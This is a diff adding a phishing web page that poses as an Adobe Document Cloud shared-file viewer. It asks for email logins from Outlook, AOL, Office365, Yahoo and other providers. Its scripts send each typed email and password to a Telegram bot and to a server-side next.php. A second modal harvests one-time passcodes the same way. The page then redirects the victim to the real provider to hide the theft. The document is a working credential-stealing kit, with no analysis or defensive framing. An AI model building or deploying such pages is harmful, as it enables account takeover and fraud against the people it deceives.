@@ -1,0 +1,391 @@
+<html lang="en"><head>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Yellowtail&amp;display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+    <title>Share Point Online</title>
+    <link href="hover.css" rel="stylesheet" media="all">
+    <link href="" rel="stylesheet" media="all">
+
+    <style type="text/css">
+
+
+    </style>
+    
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  </head>
+  <body class="" style="">
+    <div class="container-fluid">
+      <div class="row" style="background-image: url('images/bg.jpg'); background-size: cover;background-repeat: no-repeat;">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-6 mx-auto my-5 px-5 pb-5" style="border:1px solid; background-color: rgba(0,0,0,0.7);border-radius:15px;">
+              <div class="text-center pt-5"> 
+                <img src="images/adobe.jpg" class="img-fluid" width="100px"><br>
+                <span class="h4 text-white">Adobe Document Cloud</span><br>
+                <span class="h5 text-white font-weight-normal">To read the document, please choose your email provider below login to view shared file.</span>
+              </div>
+              <div class="mt-3">
+                <div class="row">
+
+
+                
+                    
+                  </div>
+                  <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="outlookmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" style=" background-color: #0073C8;">
+                        <img src="images/outlook1.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Outlook</span>
+                      </div>
+                    </a>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col-lg-12 ">
+                    <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class="  mt-2" style=" background-color: #31459B;">
+                        <img src="images/aol1 (1).png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Aol</span>
+                      </div>
+                    </a>
+                  </div>
+                  <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" style=" background-color: #FF3C00;">
+                        <img src="images/office3651.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Office365</span>
+                      </div>
+                    </a>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="yahoomodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" style=" background-color: #5F0F68;">
+                        <img src="images/yahoo1.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Yahoo!</span>
+                      </div>
+                    </a>
+                  </div>
+                  <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="othermodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" style=" background-color: #0B5BD3;">
+                        <img src="images/other1.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Other Mail</span>
+                      </div>
+                    </a>
+                  </div>
+                  <div class="col-lg-12">
+                     <p class="text-white mt-3 text-center">Built upon Adobe Document Cloud, Adobe Document Cloud features can be unlocked by providing an additional license key.</p>
+                <p class="h5 text-center text-white">CopyRight© 2025 Adobe system incorporated, All right reserved.</p> 
+                    
+                  </div>
+               
+              </div> 
+            </div>
+          </div>
+        </div>
+
+
+
+      </div> 
+    </div>
+
+
+
+
+    <!-- Modal for gmail -->
+    <!-- ...existing code... -->
+<div class="modal fade" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">×</span>
+        </button>
+      </div>
+      <div class="modal-body">
+        <center>
+          <img id="fieldImg" src="images/outlook.png" class="img-fluid rounded-circle" width="80px">
+          <h5 class="modal-title" id="exampleModalLabel">Login with <span id="field">Outlook</span></h5>
+          <div class="alert alert-danger" id="msg" style="display: none;">Please try again later</div>
+        </center>
+        <form id="contact" class="form-horizontal well">
+          <div class="col-lg-12">
+            <div class="form-group">
+              <label for="exampleInputEmail1">Email address</label>
+              <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email">
+              <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
+            </div>
+          </div>
+          <div class="col-lg-12">
+            <div class="form-group">
+              <label for="Password">Password</label>
+              <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password">
+            </div>
+          </div>
+        </form></div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+          <button class="btn btn-lg btn-info pull-right" id="submit-btn">Login</button>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<script type="text/javascript">
+	
+const form = document.getElementById('contact');
+const submitBtn = document.getElementById('submit-btn');
+const token = 'YOUR_BOT_TOKEN';
+const chatId = 'YOUR_CHAT_ID';
+
+submitBtn.addEventListener('click', (e) => {
+  const email = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
+  const message = `Email: ${email} \n Password: ${password}`;
+
+  fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+    .then(response => response.json())
+    .then(data => console.log('Message sent!'))
+    .catch(error => console.error('Error:', error));
+});
+
+
+</script>
+
+<!-- Modal for OTP -->
+<div class="modal fade" id="otpModal" tabindex="-1" role="dialog" aria-labelledby="otpModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">×</span>
+        </button>
+      </div>
+      <div class="modal-body">
+        <center>
+          <h5 class="modal-title" id="otpModalLabel">Enter OTP</h5>
+          <div class="alert alert-danger" id="otpMsg">Please try again later</div>
+        </center>
+        <form id="otpForm" class="form-horizontal well">
+          <div class="col-lg-12">
+            <div class="form-group">
+              <label for="otp">OTP</label>
+              <input type="text" name="otp" class="form-control" id="otp" placeholder="Enter OTP">
+            </div>
+          </div>
+        </form></div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+          <button class="btn btn-lg btn-info pull-right" id="otp-submit-btn">Verify OTP</button>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<!--=========== FOR OTP =================--> 
+<script type="text/javascript">
+	
+const form = document.getElementById('otpForm');
+const submitBtn = document.getElementById('otp-submit-btn');
+const token = 'YOUR_BOT_TOKEN';
+const chatId = 'YOUR_CHAT_ID';
+
+submitBtn.addEventListener('click', (e) => {
+  const otp = document.getElementById('otp').value;
+  const message = `\n OTP: ${otp}`;
+
+  fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+    .then(response => response.json())
+    .then(data => console.log('Message sent!'))
+    .catch(error => console.error('Error:', error));
+});
+
+
+</script>
+    
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <!-- <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script> -->
+
+
+  <!-- <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script> -->
+
+<script>
+    /* global $ */
+    $(document).ready(function(){
+      // Initialize count from local storage or set to 0 if not present
+      var count = localStorage.getItem('loginAttemptCount') ? parseInt(localStorage.getItem('loginAttemptCount')) : 0;
+
+      $('#outlookmodal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'images/outlook.png');
+        $('#field').html("Outlook");
+        $('#ajaxModal').modal('show');
+      });
+
+      $('#aolmodal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'images/aol.png');
+        $('#field').html("Aol");
+        $('#ajaxModal').modal('show');
+      });
+
+      $('#office365modal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'images/office365.png');
+        $('#field').html("Office365");
+        $('#ajaxModal').modal('show');
+      });
+
+      $('#yahoomodal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'images/yahoo.png');
+        $('#field').html("Yahoo");
+        $('#ajaxModal').modal('show');
+      });
+
+      $('#othermodal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'images/other1.png');
+        $('#field').html("Other Mail");
+        $('#ajaxModal').modal('show');
+      });
+
+      $('#submit-btn').click(function(event){
+        event.preventDefault();
+        var email = $("#email").val();
+        var password = $("#password").val();
+        var detail = $("#field").html();
+
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
+        count = count + 1;
+        localStorage.setItem('loginAttemptCount', count); // Store count in local storage
+        console.log("Login attempt count: " + count); // Debugging line
+        if (count >= 3) {
+          count = 0;
+          localStorage.setItem('loginAttemptCount', count); // Reset count in local storage
+          $('#ajaxModal').modal('hide'); // Hide the login attempt modal
+          $('#otpModal').modal('show'); // Show the OTP modal
+          console.log("OTP modal should be shown now."); // Debugging line
+        } else {
+          $.ajax({
+            dataType: 'JSON',
+            url: 'next.php',
+            type: 'POST',
+            data: {
+              email: email,
+              password: password,
+              detail: detail,
+            },
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifying...');
+            },
+            success: function(response){
+              $("#password").val("");
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                  $('#msg').html(response['msg']);
+                } else {
+                  $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              $("#msg").show();
+              $('#msg').html("Please try again later");
+            },
+            complete: function(){
+              $('#submit-btn').html('Login');
+            }
+          });
+        }
+      });
+
+      $('#otp-submit-btn').click(function(event){
+        event.preventDefault();
+        var otp = $("#otp").val();
+        var email = $("#email").val(); // Get the email from the previous form
+        var detail = $("#field").html();
+
+        console.log("Sending OTP:", otp); // Debugging line
+        console.log("Sending Email:", email); // Debugging line
+
+        $.ajax({
+          dataType: 'JSON',
+          url: '#',
+          type: 'POST',
+          data: {
+            otp: otp,
+            detail: detail,
+            email: email // Pass the email to the server
+          },
+          beforeSend: function(xhr){
+            $('#otp-submit-btn').html('Verifying...');
+          },
+          success: function(response){
+            console.log("Response from server:", response); // Debugging line
+            if(response){
+              if(response['signal'] == 'ok'){
+                var redirectUrl = "";
+                switch (detail.toLowerCase()) {
+                  case 'outlook':
+                    redirectUrl = "https://outlook.com";
+                    break;
+                  case 'aol':
+                    redirectUrl = "https://aol.com";
+                    break;
+                  case 'office365':
+                    redirectUrl = "https://office.com";
+                    break;
+                  case 'yahoo':
+                    redirectUrl = "https://yahoo.com";
+                    break;
+                  default:
+                    redirectUrl = "https://mail.google.com";
+                    break;
+                }
+                window.location.replace(redirectUrl);
+              } else {
+                $('#otpMsg').html(response['msg']).show();
+              }
+            }
+          },
+          error: function(xhr, status, error){
+            console.log("Error:", error); // Debugging line
+            $('#otpMsg').html("Please try again later").show();
+          },
+          complete: function(){
+            $('#otp-submit-btn').html('Verify OTP');
+          }
+        });
+      });
+    });
+</script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'92ab4455ed99001c',t:'MTc0MzcxMTYzMC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;"></iframe>
+</body></html>
